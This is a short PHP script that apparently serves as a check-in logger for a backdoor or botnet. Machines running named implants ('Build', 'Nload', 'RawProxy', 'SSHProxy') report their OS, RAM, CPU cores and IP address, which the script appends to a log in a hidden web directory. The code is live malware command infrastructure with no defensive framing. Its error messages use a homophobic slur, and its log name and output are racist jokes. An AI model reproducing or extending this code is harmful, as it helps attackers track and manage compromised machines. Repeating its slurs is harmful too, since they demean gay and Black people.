<?php

$BlackDoors = array("Build", "Nload", "RawProxy", "SSHProxy");

if(isset($_GET['BlackdoorName'])) 
{ 
	if(!in_array($_GET['BlackdoorName'], $BlackDoors)) 
	{
		die("Invalid Name");
	}
	$BlackdoorName = $_GET['BlackdoorName'];
} else {
	die("I hate my name");
}


if(isset($_GET['OS']))
{
	$OperatingSystem = $_GET['OS']; 
} else {
	die("This isn't an os you fucking faggot lel.");
}

if(isset($_GET['Ram']))
{
	$RamAmmount = $_GET['Ram'];
} else {
	die("WTF NO RAM!");
}

if(isset($_GET['Cores']))
{
	$CoreAmmount = $_GET['Cores'];
} else {
	die("WTF NO CPU BLOOD?");
}

if(isset($_SERVER['REMOTE_ADDR']))
{
	$IP = $_SERVER['REMOTE_ADDR'];
} else {
	die("Bad IP");
}

$date = date('m/d/Y h:i:s a', time());

$file = fopen("/var/www/html/SecretAssFoldfer/BlackieWackies.txt", "a+") or die("Unable To Open File!");
fwrite($file, "[" . $date . "][BackdoorName]: " . $BlackdoorName . " [IP]: ". $IP ." [OS]: ". $OperatingSystem . " [Ram]: " . $RamAmmount . " [Cores]: " . $CoreAmmount . "\n");
fclose($file);

echo "Black People";

?>